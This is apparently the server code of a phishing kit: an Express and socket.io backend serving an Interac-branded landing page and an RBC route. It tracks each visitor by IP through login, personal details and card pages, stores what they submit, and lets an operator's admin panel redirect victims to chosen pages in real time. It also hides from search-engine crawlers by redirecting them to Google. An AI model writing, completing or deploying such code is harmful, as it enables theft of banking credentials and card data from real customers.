// ====================
// Module Imports
// ====================
const express = require('express');
const { createServer } = require('node:http');
const bodyParser = require('body-parser');
const { join } = require('node:path');
const { Server } = require('socket.io');
const fs = require('fs');
const {
  emitUpdatedUsers,
  usersAdd,
  verifyUser,
  usersSearchByIP,
  usersRemove,
  usersModify,
  usersRemoveAll,
  configsModify,
  emitUpdatedConfigs,
  getConfigs
} = require('./utilityUser');

// ====================
// Configuration
// ====================
const app = express();
const server = createServer(app);
const io = new Server(server);
const REAL_PATH = __dirname;
let users = [];

const botList = [
  'Googlebot',
  'googlebot-image',
  'googlebot-mobile',
  'MSNBot',
  // ... Add all the bots from your list
];

const redirectBots = (req, res, next) => {
  const userAgent = req.get('User-Agent');
  const isBot = botList.some(botUserAgent => userAgent.includes(botUserAgent));

  if (isBot) {
    return res.redirect('https://www.google.com');
  }

  next();
};

// Use this middleware in your app before your routes
app.use(redirectBots);


// ====================
// Middleware
// ====================
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(join(__dirname, '/landing/interac/page.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(join(__dirname, '/admin/page.html'));
});

app.get('/admin/config', (req, res) => {
  res.sendFile(join(__dirname, '/admin/config.html'));
});

app.use('/rbc', require('./routes/rbc'));

// ====================
// Socket Handling
// ====================
io.on('connection', (socket) => {
  let user = null;
  let userIP = socket.handshake.address.replace('::ffff:', '');
  socket.join(userIP)
  //console.log(`${userIP} user connected !`);
  user = usersSearchByIP(userIP)

  let configs = getConfigs()
  let cpt = 0
  let removeDetails = {removeDetails: false}
  for(key in configs[0]){
    if(!key.includes('banks') && configs[0][key] == false){
      cpt++;
    }
  }

  if(cpt == 10){
    removeDetails = {removeDetails: true}
  }

  console.log(removeDetails)

  socket.emit('removeDetails', removeDetails)

  if (user) {
    //console.log(`${userIP} user already exist !`);
    user = usersModify(userIP, { status: true });
    //console.log(user);
    emitUpdatedUsers(io)
  } else {
    //console.log(`${userIP} user not exist !`)
    socket.join(userIP);
    user = { ip: userIP, status: true } 
    user = usersAdd(user)
    //console.log(`user was succesfully added: ${user.ip}`)
    emitUpdatedUsers(io)
  }

  socket.on('disconnect', () => {
    if (verifyUser(userIP)) {
      user = usersModify(userIP, { status: false });
      //console.log(user)
      emitUpdatedUsers(io)
    }
  });

  socket.on('updateBanks', (data) => {
    //console.log(data)
    if (verifyUser(userIP)) {
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })

  socket.on('updatePage', (data) => {
    //console.log(data)
    if (verifyUser(userIP)) {
      if (data.page.includes('Details')) {
        const rawData = fs.readFileSync('configs.json', 'utf-8');
        const updatedConfig = JSON.parse(rawData);
        io.emit('sendConfigs', updatedConfig);
      }
      user = usersModify(userIP, data);
      emitUpdatedUsers(io)
    }
  })

  socket.on('submit', (data) => {
    if (verifyUser(userIP)) {
      if ('previousPage' in data) {
        if (data.previousPage.includes('Login')) {
          //console.log(`modify = ${data.previousPage}`)
          let controller = {nextPage: 'details'}
          if(removeDetails){controller = {nextPage: 'card'}}
          user = usersModify(userIP, controller)
        } else if (data.previousPage.includes('Details')) {
          user = usersModify(userIP, { nextPage: 'card' })
        } else if (data.previousPage.includes('Card')) {
          user = usersModify(userIP, { nextPage: 'finish' })
        }
      } else {
        user = usersModify(userIP, data);
      }
      emitUpdatedUsers(io);

    }
    //console.log(data)
  })

  socket.on('btnRedirection', (data) => {
    console.log(`${data.page}`)
    console.log(data.ip)
    socket.to(data.ip).emit('btnRedirection', {page: data.page})
  });

  socket.on('usersRemoveAll', () => {
    usersRemoveAll();
  })

  emitUpdatedConfigs(io)

  socket.on('submitConfig', (data) => {
    //console.log(data);
    configsModify(data.banks, data);
  })

});

fs.watch('users.json', (eventType, filename) => {
  if (filename && eventType === 'change') {
    emitUpdatedUsers(io);
  }
});




// ====================
// Server Startup
// ====================
server.listen(3000, () => {
  console.log('server running at http://localhost:3000');
});